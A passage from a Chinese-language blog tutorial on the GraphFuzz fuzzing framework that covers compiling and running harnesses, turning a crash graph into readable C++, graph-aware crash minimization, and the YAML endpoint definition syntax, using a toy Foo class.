href="#fl1">附录</a></p><ul><li>最后，我们编译模糊器harness：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang++ -o fuzz_exec fuzz_exec.cpp -fsanitize=fuzzer -lprotobuf -lgraphfuzz<br></code></pre></td></tr></tbody></table></figure><p>注意：GraphFuzz通过hook的方式使用libFuzzer，因此我们可以使用libFuzzer的功能如 <code>user_value_profile</code>, <code>fork</code>, <code>dict</code> 等。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fuzz_exec -use_value_profile=1<br></code></pre></td></tr></tbody></table></figure><p>运行结果：</p><p><img src="/2022/06/24/GraphFuzz%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/o2.png"></p><ul><li>每个测试用例文件表示一个序列化的数据流图，因此我们查看crash是不可读的：</li></ul><p><img src="/2022/06/24/GraphFuzz%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/o3.png"></p><ul><li>为了使其可读，我们使用<code>fuzz_write</code> harness从图中合成源代码：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang++ -o fuzz_write fuzz_write.cpp -fsanitize=fuzzer -lprotobuf -lgraphfuzz<br></code></pre></td></tr></tbody></table></figure><ul><li>然后运行<code>fuzz_write</code>来合成harness：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./fuzz_write crash-402bbad640a94933571939f685ea1e9dc4b937f8<br></code></pre></td></tr></tbody></table></figure><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"lib.h"</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE(t) static_cast<span class="hljs-string">&lt;t *&gt;</span>(calloc(sizeof(t), 1))</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">GFUZZ_BUNDLE</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">void</span> *active;<br>    <span class="hljs-type">void</span> *inactive;<br>    <span class="hljs-built_in">GFUZZ_BUNDLE</span>(<span class="hljs-type">void</span> *_active, <span class="hljs-type">void</span> *_inactive): <span class="hljs-built_in">active</span>(_active), <span class="hljs-built_in">inactive</span>(_inactive) {}<br>};<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUNDLE(a,b) new GFUZZ_BUNDLE((void *)a, (void *)b)</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{<br>    Foo *var_0;<br>    { <span class="hljs-comment">// begin shim_0</span><br>        var_0 = <span class="hljs-built_in">MAKE</span>(Foo);<br>        Foo ref = <span class="hljs-built_in">Foo</span>();<br>        *var_0 = ref;<br>    } <span class="hljs-comment">// end shim_0</span><br>    Foo *var_1;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_0-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">70</span>); <span class="hljs-comment">// ascii 'F'</span><br>        var_1 = var_0;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_2;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_1-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">85</span>); <span class="hljs-comment">// ascii 'U'</span><br>        var_2 = var_1;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_3;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_2-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">90</span>); <span class="hljs-comment">// ascii 'Z'</span><br>        var_3 = var_2;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_4;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_3-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">90</span>); <span class="hljs-comment">// ascii 'Z'</span><br>        var_4 = var_3;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_5;<br>    { <span class="hljs-comment">// begin shim_3</span><br>        var_4-&gt;<span class="hljs-built_in">check</span>(); <span class="hljs-comment">// __builtin_trap</span><br>        var_5 = var_4;<br>    } <span class="hljs-comment">// end shim_3</span><br>    Foo *var_6;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_5-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">5</span>);<br>        var_6 = var_5;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_7;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_6-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">0</span>);<br>        var_7 = var_6;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_8;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_7-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">0</span>);<br>        var_8 = var_7;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_9;<br>    { <span class="hljs-comment">// begin shim_3</span><br>        var_8-&gt;<span class="hljs-built_in">check</span>();<br>        var_9 = var_8;<br>    } <span class="hljs-comment">// end shim_3</span><br>    { <span class="hljs-comment">// begin shim_1</span><br>        <span class="hljs-built_in">free</span>(var_9);<br>    } <span class="hljs-comment">// end shim_1</span><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>该crash在内部仍被表示为数据流图，我们可以使用同样的模糊器概念来进行图感知的最小化</li></ul><blockquote><p><span class="github-emoji"><span>📓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f4d3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 目前libFuzzer不支持自定义minimize_crash选项，默认情况下会尝试执行字节感知的最小化，因此提供了一个图感知最小化工具作为<code>gfuzz</code>的一部分</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Usage: gfuzz min [fuzzer] [crash]</span><br>$ gfuzz min ./fuzz_exec crash-402bbad640a94933571939f685ea1e9dc4b937f8<br></code></pre></td></tr></tbody></table></figure><p>运行结果：</p><p><img src="/2022/06/24/GraphFuzz%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/o4.png"></p><ul><li>然后我们查看最小化后的测试用例：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./fuzz_write crash-402bbad640a94933571939f685ea1e9dc4b937f8.min<br></code></pre></td></tr></tbody></table></figure><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"lib.h"</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE(t) static_cast<span class="hljs-string">&lt;t *&gt;</span>(calloc(sizeof(t), 1))</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">GFUZZ_BUNDLE</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">void</span> *active;<br>    <span class="hljs-type">void</span> *inactive;<br>    <span class="hljs-built_in">GFUZZ_BUNDLE</span>(<span class="hljs-type">void</span> *_active, <span class="hljs-type">void</span> *_inactive): <span class="hljs-built_in">active</span>(_active), <span class="hljs-built_in">inactive</span>(_inactive) {}<br>};<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUNDLE(a,b) new GFUZZ_BUNDLE((void *)a, (void *)b)</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{<br>    Foo *var_0;<br>    { <span class="hljs-comment">// begin shim_0</span><br>        var_0 = <span class="hljs-built_in">MAKE</span>(Foo);<br>        Foo ref = <span class="hljs-built_in">Foo</span>();<br>        *var_0 = ref;<br>    } <span class="hljs-comment">// end shim_0</span><br>    Foo *var_1;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_0-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">70</span>); <span class="hljs-comment">// ascii 'F'</span><br>        var_1 = var_0;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_2;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_1-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">85</span>); <span class="hljs-comment">// ascii 'U'</span><br>        var_2 = var_1;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_3;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_2-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">90</span>); <span class="hljs-comment">// ascii 'Z'</span><br>        var_3 = var_2;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_4;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_3-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">90</span>); <span class="hljs-comment">// ascii 'Z'</span><br>        var_4 = var_3;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_5;<br>    { <span class="hljs-comment">// begin shim_3</span><br>        var_4-&gt;<span class="hljs-built_in">check</span>(); <span class="hljs-comment">// __builtin_trap</span><br>        var_5 = var_4;<br>    } <span class="hljs-comment">// end shim_3</span><br>    { <span class="hljs-comment">// begin shim_1</span><br>        <span class="hljs-built_in">free</span>(var_5);<br>    } <span class="hljs-comment">// end shim_1</span><br>}<br></code></pre></td></tr></tbody></table></figure><p><span class="github-emoji"><span>👏</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f44f.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>👏</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f44f.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>👏</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f44f.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 上述结果删除了冗余的代码</p><h2 id="5-端点"><a href="#5-端点" class="headerlink" title="5. 端点"></a>5. 端点</h2><ul><li>端点是一个GraphFuzz harness基本构建块（数据流图的顶点），本节主要探索完整的端点定义语法：</li></ul><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Foo:</span><br>    <span class="hljs-string">...</span><br>    <span class="hljs-attr">methods:</span><br>    <span class="hljs-string">...</span><br>    <span class="hljs-comment"># Endpoint name.</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">myEndpoint:</span><br>        <span class="hljs-comment"># List of "live" inputs.</span><br>        <span class="hljs-attr">inputs:</span> [<span class="hljs-string">'Foo'</span>, <span class="hljs-string">'Bar'</span>]<br><br>        <span class="hljs-comment"># List of "live" outputs.</span><br>        <span class="hljs-attr">outputs:</span> [<span class="hljs-string">'Bar'</span>]<br><br>        <span class="hljs-comment"># Additional fuzzable parameters.</span><br>        <span class="hljs-attr">args:</span> [<span class="hljs-string">'int'</span>, <span class="hljs-string">'char[10]'</span>]<br><br>        <span class="hljs-comment"># Endpoint code. (<span class="hljs-doctag">note:</span> "exec: |" is YAML syntax for a multiline string)</span><br>        <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br><span class="hljs-string">            // Arbitrary C/C++ code here</span><br><span class="hljs-string">            for (int i = 0; i &lt; 10; ++i) {</span><br><span class="hljs-string">                $a1[i] &amp;= 0x7f;</span><br><span class="hljs-string">            }</span><br><span class="hljs-string">            $i1-&gt;doFunction($i0, $a0, $a1);</span><br><span class="hljs-string">            $o0 = $i1;</span><br></code></pre></td></tr></tbody></table></figure><ul><li>可以将端点定义抽象为一个代码片段，对用法有一定的要求：</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// [前提条件:]</span><br><span class="hljs-comment">// $i0 is a live Foo *</span><br><span class="hljs-comment">// $i1 is a live Bar *</span><br><span class="hljs-comment">// $a0 is an int</span><br><span class="hljs-comment">// $a1 is a char[10]</span><br>{<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; ++i) {<br>        $a1[i] &amp;= <span class="hljs-number">0x7f</span>;<br>    }<br>    $i1-&gt;<span class="hljs-built_in">doFunction</span>($i0, $a0, $a1);<br>    $o0 = $i1;<br>}<br><span class="hljs-comment">// [前提条件:]</span><br><span class="hljs-comment">// $o0 is a live Bar *</span><br></code></pre></td></tr></tbody></table></figure><p>注：为了运行此代码，我们需要初始化多个对象，包括实时数据类型。运行此代码后，将剩下一个对象（Bar *），我们需要清理该对象</p><ul><li>模糊测试引擎将通过调用构造必要对象并析构结果对象的其他端点来自动识别如何调用此端点</li></ul><hr><ul><li>在<a href="#basicusage">基本用法</a>中，我们使用以下模式来自动生成完整的端点定义</li></ul><p><strong>schema.yaml：</strong></p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Foo:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">struct</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">Foo</span><br>  <span class="hljs-attr">headers:</span> [<span class="hljs-string">lib.h</span>]<br>  <span class="hljs-attr">methods:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">Foo()</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">~Foo()</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">write(char</span> <span class="hljs-string">val)</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">check()</span><br></code></pre></td></tr></tbody></table></figure><ul><li>在内部，GraphFuzz生成了一个完整的模式，如下所示：</li></ul><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Foo:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">struct</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">Foo</span><br>  <span class="hljs-attr">headers:</span> [<span class="hljs-string">lib.h</span>]<br>  <span class="hljs-attr">methods:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">Foo():</span><br>      <span class="hljs-attr">outputs:</span> [<span class="hljs-string">'Foo'</span>]<br>      <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        $o0 = new Foo();</span><br><span class="hljs-string"></span>  <span class="hljs-bullet">-</span> <span class="hljs-string">~Foo():</span><br>      <span class="hljs-attr">inputs:</span> [<span class="hljs-string">'Foo'</span>]<br>      <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        delete $i0;</span><br><span class="hljs-string"></span>  <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">write(char</span> <span class="hljs-string">val):</span><br>      <span class="hljs-attr">inputs:</span> [<span class="hljs-string">'Foo'</span>]<br>      <span class="hljs-attr">outputs:</span> [<span class="hljs-string">'Foo'</span>]<br>      <span class="hljs-attr">args:</span> [<span class="hljs-string">'char'</span>]<br>      <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        $i0-&gt;write($a0);</span><br><span class="hljs-string">        $o0 = $i0;</span><br><span class="hljs-string"></span>  <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">check():</span><br>      <span class="hljs-attr">inputs:</span> [<span class="hljs-string">'Foo'</span>]<br>      <span class="hljs-attr">outputs:</span> [<span class="hljs-string">'Foo'</span>]<br>      <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        $i0-&gt;check();</span><br><span class="hljs-string">        $o0 = $i0;</span><br></code></pre></td></tr></tbody></table></figure><ul><li>接下来一一分析端点：</li></ul><p><span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>Foo::Foo()</strong></p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">Foo():</span><br>    <span class="hljs-attr">outputs:</span> [<span class="hljs-string">'Foo'</span>]<br>    <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br>        <span class="hljs-string">$o0</span> <span class="hljs-string">=</span> <span class="hljs-string">new</span> <span class="hljs-string">Foo();</span><br></code></pre></td></tr></tbody></table></figure><ul><li>该端点无输入和上下文参数（直接省略这些字段）。因为该端点是一个构造函数，其产生一个<code>Foo</code>类型的输出。在输出中，我们编写输出对象的类型名称。在<code>exec</code>模板中，我们需要实际调用这个构造函数。因为我们指定了输出，所以我们可以访问模板变量**$o0**（第0个输出），该变量将填充为一个<code>Foo *</code>指针。</li></ul><p><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>Foo::~Foo()</strong></p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">~Foo():</span><br>    <span class="hljs-attr">inputs:</span> [<span class="hljs-string">'Foo'</span>]<br>    <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br>        <span class="hljs-string">delete</span> <span class="hljs-string">$i0;</span><br></code></pre></td></tr></tbody></table></figure><ul><li>该端点是一个析构函数。为了调用析构函数，我们需要一个对象的实例；因此，我们在<code>inputs</code>数组中指定一个<code>Foo</code>对象。因为我们指定了一个输入，所以我们可以访问模板变量**$i0**（第0个输入），即一个<code>Foo *</code>指针。</li></ul><p><span class="github-emoji"><span>3⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>Foo::check()</strong></p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">check():</span><br>    <span class="hljs-attr">inputs:</span> [<span class="hljs-string">'Foo'</span>]<br>    <span class="hljs-attr">outputs:</span> [<span class="hljs-string">'Foo'</span>]<br>    <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        $i0-&gt;check();</span><br><span class="hljs-string">        $o0 = $i0;</span><br></code></pre></td></tr></tbody></table></figure><ul><li>该端点是一个方法调用。为了执行一个方法调用，我们需要这个对象的一个实例。在我们执行这个方法调用之后，该对象仍然有效，因此其是一个输出。我们在<code>inputs</code>和<code>outputs</code>中指定<code>Foo</code>对象。在我们执行模板时，我们可以访问<strong>$i0</strong>和<strong>$o0</strong>。当这个端点被调用时，$i0将指向一个有效的<code>Foo</code>对象并由我们负责填充**$o0**</li></ul><p><span class="github-emoji"><span>4⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0034-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>Foo::write(char)</strong></p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">write(char</span> <span class="hljs-string">val):</span><br>    <span class="hljs-attr">inputs:</span> [<span class="hljs-string">'Foo'</span>]<br>    <span class="hljs-attr">outputs:</span> [<span class="hljs-string">'Foo'</span>]<br>    <span class="hljs-attr">args:</span> [<span class="hljs-string">'char'</span>]<br>    <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        $i0-&gt;write($a0);</span><br><span class="hljs-string">        $o0 = $i0;</span><br></code></pre></td></tr></tbody></table></figure><ul><li>和<code>Foo::check()</code>一样，该端点也是一个方法调用。但是，该方法有另外一个参数：一个<code>char</code>变量将传递给我们的端点方法。<code>char</code>是一个基本类型，默认情况下，其不会作为数据流图的一部分进行跟踪。相反，在给定图中的每个端点实例包含一个此参数的单独实例，该实例可以被模糊测试。这些上下文相关的参数被指定在<code>args</code>数组中。这里我们通过模板变量**$a0**（第0个参数）来指向<code>char</code>变量。</li></ul><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="A-相关源代码"><a href="#A-相关源代码" class="headerlink" title="A. 相关源代码"></a><span id="fl1">A. 相关源代码</span></h3><ul><li><code>fuzz_exec.cpp</code>中核心代码块：</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* CPPScope(name=(auto) Foo::Foo();) */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shim_0</span><span class="hljs-params">(<span class="hljs-type">void</span> **in_ref, <span class="hljs-type">void</span> **out_ref, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *context)</span> </span>{<br>    Foo *_o0;<br>    _o0 = <span class="hljs-built_in">MAKE</span>(Foo);<br>    Foo ref = <span class="hljs-built_in">Foo</span>();<br>    *_o0 = ref;<br>    <br>                    <br>    out_ref[<span class="hljs-number">0</span>] = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">void</span> *&gt;(_o0);<br>}<br><br><br><span class="hljs-comment">/* CPPScope(name=(auto) Foo::~Foo();) */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shim_1</span><span class="hljs-params">(<span class="hljs-type">void</span> **in_ref, <span class="hljs-type">void</span> **out_ref, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *context)</span> </span>{<br>    Foo *_i0 = <span class="hljs-built_in">reinterpret_cast</span>&lt;Foo *&gt;(in_ref[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">free</span>(_i0);<br>    <br>                    <br>}<br><br><br><span class="hljs-comment">/* CPPScope(name=(auto) Foo::void write(char val);) */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shim_2</span><span class="hljs-params">(<span class="hljs-type">void</span> **in_ref, <span class="hljs-type">void</span> **out_ref, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *context)</span> </span>{<br>    Foo *_i0 = <span class="hljs-built_in">reinterpret_cast</span>&lt;Foo *&gt;(in_ref[<span class="hljs-number">0</span>]);<br>    <span class="hljs-type">char</span> _a0;<br>    <span class="hljs-built_in">memcpy</span>(&amp;_a0, context + <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>));<br>    Foo *_o0;<br>    _i0-&gt;<span class="hljs-built_in">write</span>(_a0);<br>    _o0 = _i0;<br>                        <br>    out_ref[<span class="hljs-number">0</span>] = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">void</span> *&gt;(_o0);<br>}<br><br><br><span class="hljs-comment">/* CPPScope(name=(auto) Foo::void check();) */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shim_3</span><span class="hljs-params">(<span class="hljs-type">void</span> **in_ref, <span class="hljs-type">void</span> **out_ref, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *context)</span> </span>{<br>    Foo *_i0 = <span class="hljs-built_in">reinterpret_cast</span>&lt;Foo *&gt;(in_ref[<span class="hljs-number">0</span>]);<br>    Foo *_o0;<br>    